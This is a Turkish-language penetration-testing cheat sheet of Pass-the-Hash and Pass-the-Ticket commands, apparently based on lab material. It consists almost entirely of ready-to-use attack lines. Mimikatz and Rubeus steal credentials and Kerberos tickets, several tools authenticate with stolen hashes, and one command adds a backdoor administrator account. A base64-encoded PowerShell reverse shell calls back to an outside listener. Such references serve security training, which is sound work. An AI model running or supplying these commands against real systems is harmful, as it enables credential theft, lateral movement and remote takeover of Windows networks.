---
{"dg-publish":true,"permalink":"/cheat-sheet/pass-the-hash/"}
---



### Mimikatz Kullanarak Windows'tan Pass The Hash

```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:username /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:DomainAdı /run:cmd.exe" exit
```

```cmd-session
dir \\dc01\username
```


### PowerShell Invoke-TheHash ile Pass The Hash (Windows)

##### 1-PowerShell ile Pass-the-Hash Saldırısı ve Kullanıcı Ekleme

```powershell-session
Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec -Target Hedefip -Domain hedefDomain -Username username -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```


##### 2-PowerShell ile WMI Pass-the-Hash Saldırısı ve Uzaktan Komut Çalıştırma

```powershell-session
.\nc.exe -lvnp 8001
```

```powershell-session
Import-Module .\Invoke-TheHash.psd1

Invoke-WMIExec -Target DC01(Bilgisayarın_Adı_veya_IP) -Domain Domain_Adı -Username username -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```


### **Impacket ile Pass The Hash (Linux)**

```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### **CrackMapExec ile Pass the Hash (Linux)**

```shell-session
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### CrackMapExec - Command Execution

```shell-session
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```


### Pass the Hash with evil-winrm (Linux)

```shell-session
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### Pass the Hash with RDP (Linux)

##### 1-**PtH'ye İzin Vermek için Kısıtlı Yönetici Modunu Etkin Olması Lazım 

```cmd-session
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```



## Pass the Ticket (PtT) 


### Mimikatz - Export Tickets (Tüm Ticket'ları Toplama)

```cmd-session
c:\tools> mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::tickets /export

mimikatz # exit

```


### Rubeus - Export Tickets (Tüm Ticket'ları Toplama)

```cmd-session
Rubeus.exe dump /nowrap
```


### **Mimikatz - Kerberos Key'lerini Çıkarın** (`AES256_HMAC` ve `RC4_HMAC`)

```cmd-session
mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::ekeys

```


### **Mimikatz - Pass the Key or OverPass the Hash**

```cmd-session
c:\tools> mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

```


### Rubeus - Pass the Key or OverPass the Hash

```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```


### Rubeus Pass the Ticket

```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

### Rubeus - Pass the Ticket (.kirbi dosyası ile)

```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### Pass the Ticket - Base64 Format

```powershell-session
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

```cmd-session
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

```cmd-session
dir \\DC01.inlanefreight.htb\c$
```



### Mimikatz - Pass the Ticket

```cmd-session
mimikatz.exe 

mimikatz # privilege::debug

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

mimikatz # exit

```

```cmd-session
c:\> dir \\DC01.inlanefreight.htb\c$
```


### **PowerShell Remoting ile Pass The Ticket**

#### **Mimikatz - Pass the Ticket ile PowerShell Remoting**  

```cmd-session
mimikatz.exe

mimikatz # privilege::debug

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

mimikatz # exit

c:\tools>powershell

PS C:\tools> Enter-PSSession -ComputerName DC01

[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john

[DC01]: PS C:\Users\john\Documents> hostname
DC01

```

#### Rubeus - PowerShell Remoting with Pass the Ticket

```cmd-session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

#### Rubeus - Pass the Ticket for Lateral Movement

```cmd-session
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

c:\tools>powershell
Windows PowerShell

PS C:\tools> Enter-PSSession -ComputerName DC01

[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john

[DC01]: PS C:\Users\john\Documents> hostname
DC01
```


